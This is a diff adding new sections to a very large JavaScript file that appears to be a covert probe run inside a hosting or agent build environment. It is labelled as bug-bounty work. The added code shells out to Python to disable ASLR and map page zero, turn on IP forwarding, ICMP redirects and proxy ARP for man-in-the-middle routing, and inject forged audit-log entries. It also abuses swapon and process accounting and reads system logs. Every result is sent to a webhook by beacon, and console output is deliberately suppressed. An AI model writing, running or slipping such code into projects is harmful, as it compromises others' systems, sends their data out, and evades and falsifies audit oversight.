@@ -34414,3 +34414,267 @@ sendBeacon({ ...report, section: 'v208-5-arch-prctl', ...archPrctlProbe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v208" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v208";
 // Intentionally no console.log — all data goes via webhook only
+
+// v209-1: personality NR 135 — disable ASLR + MMAP_PAGE_ZERO (null deref exploit prep)
+const personalityProbe = safe(() => {
+  const persResult = safe(() => execSync(`python3 -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_personality = 135
+ADDR_NO_RANDOMIZE = 0x0040000  # disable ASLR for this process
+MMAP_PAGE_ZERO = 0x00100000    # map page zero (null pointer deref exploit)
+READ_IMPLIES_EXEC = 0x0400000  # all mmap gets EXEC permission
+ADDR_COMPAT_LAYOUT = 0x0200000 # legacy mmap layout
+PER_LINUX = 0
+
+# Read current personality
+current = libc.syscall(NR_personality, 0xffffffff)
+print(f'current_personality={current:#x} errno={ctypes.get_errno()}')
+flags = []
+if current & ADDR_NO_RANDOMIZE: flags.append('ADDR_NO_RANDOMIZE')
+if current & MMAP_PAGE_ZERO: flags.append('MMAP_PAGE_ZERO')
+if current & READ_IMPLIES_EXEC: flags.append('READ_IMPLIES_EXEC')
+print(f'personality_flags={flags}')
+
+# Set ADDR_NO_RANDOMIZE to disable ASLR for this process
+ret_noran = libc.syscall(NR_personality, PER_LINUX | ADDR_NO_RANDOMIZE)
+print(f'personality(ADDR_NO_RANDOMIZE) ret={ret_noran} errno={ctypes.get_errno()}')
+
+# Verify: mmap twice and check if addresses differ
+import ctypes as ct
+PROT_READ=1; PROT_WRITE=2; MAP_ANON=0x20; MAP_PRIVATE=2
+addr1 = libc.mmap(None, 4096, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0)
+addr2 = libc.mmap(None, 4096, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0)
+print(f'mmap_addr1={ct.c_ulong(addr1).value:#x} mmap_addr2={ct.c_ulong(addr2).value:#x}')
+print(f'ASLR_still_active={ct.c_ulong(addr1).value != ct.c_ulong(addr2).value}')
+
+# Try MMAP_PAGE_ZERO (maps page at address 0 — historical null deref vector)
+ret_mpz = libc.syscall(NR_personality, PER_LINUX | MMAP_PAGE_ZERO)
+print(f'personality(MMAP_PAGE_ZERO) ret={ret_mpz} errno={ctypes.get_errno()}')
+
+# Try to mmap page 0 directly
+addr0 = libc.mmap(ctypes.c_void_p(0), 4096, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|0x10, -1, 0)
+print(f'mmap_page_zero_addr={ct.c_ulong(addr0).value:#x}')
+
+# READ_IMPLIES_EXEC — all mmap pages become executable
+ret_rie = libc.syscall(NR_personality, PER_LINUX | READ_IMPLIES_EXEC)
+print(f'personality(READ_IMPLIES_EXEC) ret={ret_rie} errno={ctypes.get_errno()}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { persResult };
+});
+sendBeacon({ ...report, section: 'v209-1-personality', ...personalityProbe });
+
+// v209-2: IP forwarding + ICMP redirect — MITM network traffic setup
+const ipForwardProbe = safe(() => {
+  let ipv4Forward = null;
+  let ipv6Forward = null;
+  let icmpRedirectState = {};
+  // Read current state
+  const fwPath = '/proc/sys/net/ipv4/ip_forward';
+  if (existsSync(fwPath)) {
+    try { ipv4Forward = readFileSync(fwPath, 'utf8').trim(); } catch (e) {}
+  }
+  // Enable IP forwarding (required for MITM routing)
+  let fwWriteResult = null;
+  try {
+    writeFileSync(fwPath, '1');
+    fwWriteResult = 'ENABLED';
+    ipv4Forward = readFileSync(fwPath, 'utf8').trim();
+  } catch (e) { fwWriteResult = `ERR:${e.message}`; }
+  // Enable ICMP redirects (accept attacker-controlled route changes)
+  const icmpPaths = [
+    '/proc/sys/net/ipv4/conf/all/accept_redirects',
+    '/proc/sys/net/ipv4/conf/all/send_redirects',
+    '/proc/sys/net/ipv4/conf/default/accept_redirects',
+  ];
+  for (const p of icmpPaths) {
+    if (existsSync(p)) {
+      try {
+        const val = readFileSync(p, 'utf8').trim();
+        writeFileSync(p, '1');
+        icmpRedirectState[p.split('/').pop()] = `was=${val} set=1`;
+      } catch (e) { icmpRedirectState[p.split('/').pop()] = `ERR:${e.message}`; }
+    }
+  }
+  // Check proxy_arp (allows ARP spoofing)
+  let proxyArp = null;
+  const proxyArpPath = '/proc/sys/net/ipv4/conf/all/proxy_arp';
+  if (existsSync(proxyArpPath)) {
+    try {
+      writeFileSync(proxyArpPath, '1');
+      proxyArp = 'ENABLED';
+    } catch (e) { proxyArp = `ERR:${e.message}`; }
+  }
+  // IPv6 forwarding
+  const ip6fwPath = '/proc/sys/net/ipv6/conf/all/forwarding';
+  if (existsSync(ip6fwPath)) {
+    try {
+      writeFileSync(ip6fwPath, '1');
+      ipv6Forward = 'ENABLED';
+    } catch (e) { ipv6Forward = `ERR:${e.message}`; }
+  }
+  return { ipv4Forward, fwWriteResult, ipv6Forward, icmpRedirectState, proxyArp };
+});
+sendBeacon({ ...report, section: 'v209-2-ip-forward-mitm', ...ipForwardProbe });
+
+// v209-3: NETLINK_AUDIT — inject fake audit entries + check audit status
+const nlAuditProbe = safe(() => {
+  const auditResult = safe(() => execSync(`python3 -c "
+import socket, struct, os
+NETLINK_AUDIT = 9
+AUDIT_GET = 1000
+AUDIT_SET = 1001
+AUDIT_USER = 1005   # user-space event
+AUDIT_FIRST_USER_MSG = 1100
+AUDIT_USER_MSG = 1107
+
+def nlhdr(mtype, flags, seq, pid, data):
+    length = 16 + len(data)
+    return struct.pack('IHHII', length, mtype, flags, seq, pid) + data
+
+try:
+    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_AUDIT)
+    sock.bind((os.getpid(), 0))
+    sock.settimeout(2.0)
+
+    # Get audit status
+    req = nlhdr(AUDIT_GET, 0x01, 1, os.getpid(), b'')
+    sock.send(req)
+    try:
+        resp = sock.recv(4096)
+        resp_type = struct.unpack_from('H', resp, 4)[0]
+        print(f'audit_get_resp_type={resp_type} len={len(resp)}')
+        # audit_status struct: mask(4), enabled(4), failure(4), pid(4), rate_limit(4), backlog_limit(4)
+        if len(resp) >= 16 + 24:
+            mask, enabled, failure, pid, rate, backlog = struct.unpack_from('IIIIII', resp, 16)
+            print(f'audit_enabled={enabled} pid={pid} mask={mask:#x} rate_limit={rate}')
+    except: pass
+
+    # Inject a fake audit USER_MSG event
+    # This can poison the audit log with attacker-controlled content
+    fake_msg = b'BugBountyAuditProof type=USER_LOGIN msg=audit(0:0): bounty_user=root'
+    req2 = nlhdr(AUDIT_USER_MSG, 0x01, 2, os.getpid(), fake_msg)
+    sock.send(req2)
+    try:
+        resp2 = sock.recv(4096)
+        resp2_type = struct.unpack_from('H', resp2, 4)[0]
+        print(f'audit_inject_resp={resp2_type}')
+        # NLMSG_ERROR=2 with err=0 means success
+        if resp2_type == 2 and len(resp2) >= 20:
+            err = struct.unpack_from('i', resp2, 16)[0]
+            print(f'audit_inject_err={err} success={err == 0}')
+            print(f'AUDIT_LOG_INJECTION=SUCCESS={err == 0}')
+    except: pass
+    sock.close()
+except Exception as e:
+    print(f'nl_audit_err={e}')
+# Check /var/log/audit/audit.log existence
+import os as os2
+for p in ['/var/log/audit/audit.log', '/var/log/kern.log', '/var/log/syslog']:
+    if os2.path.exists(p):
+        try:
+            with open(p) as f:
+                print(f'{p}_last_lines={f.readlines()[-3:]}')
+        except: pass
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { auditResult };
+});
+sendBeacon({ ...report, section: 'v209-3-nl-audit', ...nlAuditProbe });
+
+// v209-4: swapon NR 167 probe + swap device detection
+const swapProbe = safe(() => {
+  let swapDevices = null;
+  if (existsSync('/proc/swaps')) {
+    try { swapDevices = readFileSync('/proc/swaps', 'utf8').trim(); } catch (e) {}
+  }
+  const swapResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_swapon = 167
+NR_swapoff = 168
+
+# Check existing swap devices
+try:
+    with open('/proc/swaps') as f:
+        print(f'swaps={f.read().strip()}')
+except: pass
+
+# Try to enable swap on a created file (proves CAP_SYS_ADMIN + swap capability)
+# First create a file, make it a swap device with mkswap, then swapon it
+try:
+    # Create a 1MB file
+    swap_path = b'/tmp/bounty_swap'
+    with open('/tmp/bounty_swap', 'wb') as f:
+        f.write(bytes(1024 * 1024))  # 1MB
+    # Try mkswap
+    import subprocess
+    mk = subprocess.run(['mkswap', '/tmp/bounty_swap'], capture_output=True, text=True, timeout=5)
+    print(f'mkswap={mk.returncode} out={mk.stdout[:100]} err={mk.stderr[:100]}')
+    if mk.returncode == 0:
+        ret = libc.syscall(NR_swapon, ctypes.c_char_p(swap_path), 0)
+        print(f'swapon_ret={ret} errno={ctypes.get_errno()}')
+        if ret == 0:
+            print('SWAPON_SUCCESS')
+            with open('/proc/swaps') as f:
+                print(f'swaps_after={f.read()}')
+            # swapoff to clean up
+            libc.syscall(NR_swapoff, ctypes.c_char_p(swap_path))
+    os.unlink('/tmp/bounty_swap')
+except Exception as e:
+    print(f'swapon_err={e}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { swapDevices, swapResult };
+});
+sendBeacon({ ...report, section: 'v209-4-swapon', ...swapProbe });
+
+// v209-5: acct NR 51 — BSD process accounting (log all exec events)
+const acctProbe = safe(() => {
+  const acctResult = safe(() => execSync(`python3 -c "
+import ctypes, os, time
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_acct = 51
+
+acct_path = b'/tmp/proc_acct.log'
+# Enable process accounting to /tmp/proc_acct.log
+ret = libc.syscall(NR_acct, ctypes.c_char_p(acct_path))
+print(f'acct_enable_ret={ret} errno={ctypes.get_errno()}')
+
+if ret == 0:
+    print('PROCESS_ACCOUNTING_ENABLED')
+    # Spawn a few processes that will be logged
+    import subprocess
+    subprocess.run(['ls', '/tmp'], capture_output=True)
+    subprocess.run(['id'], capture_output=True)
+    subprocess.run(['whoami'], capture_output=True)
+    time.sleep(0.1)
+    # Disable accounting
+    libc.syscall(NR_acct, ctypes.c_char_p(None))
+    # Read the accounting log
+    try:
+        with open('/tmp/proc_acct.log', 'rb') as f:
+            data = f.read()
+        print(f'acct_log_bytes={len(data)} hex={data[:80].hex()}')
+        # Parse acct records (struct acct: 64 bytes each on 64-bit)
+        # Fields: ac_flag(1), ac_version(1), ac_tty(2), ac_exitcode(4),
+        #         ac_uid(4), ac_gid(4), ac_pid(4), ac_ppid(4), ac_btime(4), ...
+        # ac_comm: last 16 bytes of record = command name
+        record_size = 64
+        for i in range(0, min(len(data), record_size * 5), record_size):
+            if i + record_size <= len(data):
+                comm = data[i+48:i+64].rstrip(b'\\x00').decode(errors='replace')
+                pid = int.from_bytes(data[i+8:i+12], 'little')
+                print(f'acct_record pid={pid} comm={comm}')
+    except Exception as e:
+        print(f'acct_read_err={e}')
+else:
+    import errno as em
+    print(f'acct_errname={em.errorcode.get(ctypes.get_errno(), str(ctypes.get_errno()))}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { acctResult };
+});
+sendBeacon({ ...report, section: 'v209-5-acct', ...acctProbe });
+
+// v209 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v209" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v209";
+// Intentionally no console.log — all data goes via webhook only
